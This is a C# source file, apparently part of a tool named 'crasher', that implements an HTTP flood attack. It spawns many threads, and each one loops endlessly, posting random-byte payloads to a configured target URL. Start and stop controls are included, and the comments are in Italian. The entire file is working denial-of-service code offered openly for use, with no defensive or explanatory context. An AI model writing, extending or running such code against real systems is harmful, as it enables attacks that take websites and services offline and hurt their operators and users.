using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using crasher.Model;

namespace crasher.Attacks
{
    public static class ClientRequest
    {
        private static WebClient client;
        private static Thread[] threads;
        private static bool stopFlag = false;
        private static Uri Url;
        private static bool ThreadsStarted = false;
        /**
         * Metodo che starta l'attacco, tipo di attacco a seconda del flag "threading" in AttackSettings.cs
         * **/
        public static void Start()
        {
            Console.Clear();
            Url = new Uri(AttackSettings.Url);
            client = new WebClient();

            Console.WriteLine("Threading mode: " + AttackSettings.Threading);
            if (AttackSettings.Threading)
            {
                threads = new Thread[AttackSettings.Threads];
                StartAsyncAttack();
            }
            else
            {
                stopFlag = false;
                StartAttack();
            }

            Console.WriteLine("Started client attack");
        }

        /**
         * Attacco sfruttando i thread
         * **/
        private static void StartAsyncAttack()
        {
            for (int i = 0; i < threads.Length; i++)
            {
                threads[i] = new Thread(StartAttack);
                threads[i].Start();

                Console.WriteLine("[INFO] Thread n." + i + " started attacking target: " + Url.ToString());
            }

            ThreadsStarted = true;
        }

        /**
         * Attacco utilizzando nessun thread.
         * **/
        private static void StartAttack()
        {
            while (true)
            {
                if (ThreadsStarted || !AttackSettings.Threading)
                {
                    if (stopFlag)
                    {
                        break;
                    }
                    Byte[] packet = Helpers.NetHelper.RandomFillPackets(AttackSettings.PacketSize);
                    SendData(Url,packet);
                }
                else if (!ThreadsStarted)
                {
                    System.Threading.Thread.Sleep(250);
                }

            }
        }

        /**
         * Ferma l'attacco a seconda del tipo utilizzato
         * **/
        public static void Stop() {
            if (AttackSettings.Threading)
                StopAsyncAttack();
            else
                StopAttack();
        }

        /**
         * Ferma l'attacco senza thread utilizzando un flag che genera un break
         */
        private static void StopAttack()
        {
            stopFlag = true;
        }

        /**
        * Esegue l'abort su tutti i thread.
        * **/
        private static void StopAsyncAttack() {
            foreach (Thread thread in threads) {
                thread.Abort("Stopped attack by user");
            }
        }


        public static string SendData(Uri url, byte[] data)
        {
            // Create a request using a URL that can receive a post.   
            WebRequest request = WebRequest.Create(url);
            // Set the Method property of the request to POST.  
            request.Method = "POST";
            byte[] byteArray = data;
            // Set the ContentType property of the WebRequest.  
            request.ContentType = "application/x-www-form-urlencoded";
            // Set the ContentLength property of the WebRequest.  
            request.ContentLength = byteArray.Length;
            // Get the request stream.  
            Stream dataStream = request.GetRequestStream();
            // Write the data to the request stream.  
            dataStream.Write(byteArray, 0, byteArray.Length);
            // Close the Stream object.  
            dataStream.Close();
            // Get the response.  
            WebResponse response = request.GetResponse();
            // Display the status.  
            Console.WriteLine(((HttpWebResponse)response).StatusDescription);
            // Get the stream containing content returned by the server.  
            dataStream = response.GetResponseStream();
            // Open the stream using a StreamReader for easy access.  
            StreamReader reader = new StreamReader(dataStream);
            // Read the content.  
            string responseFromServer = reader.ReadToEnd();

            reader.Close();
            dataStream.Close();
            response.Close();

            // Return response content.  
            return responseFromServer;
        }
    }
}
